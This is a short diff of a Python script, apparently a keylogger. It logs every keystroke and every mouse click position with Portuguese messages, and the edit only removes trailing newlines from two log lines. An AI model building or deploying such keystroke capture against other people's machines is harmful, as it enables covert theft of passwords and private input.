@@ -36,14 +36,14 @@ def keyboard(event):
         logging.info(characters_no_keys[event.Key])
 
     elif event.Key == "Tab" or event.Key == 'P_Enter' or event.Key == "Return":
-        logging.info(f'Separador {event.Key} Pressionado\n')
+        logging.info(f'Separador {event.Key} Pressionado')
             
     else:
         logging.info(event.Key)
 
 def on_click(x, y, button, pressed):
     if pressed:
-        logging.info(f'Mouse Pressionado em {x, y, button}\n')
+        logging.info(f'Mouse Pressionado em {x, y, button}')
 
 #Mouse
 Listen = mouse.Listener()
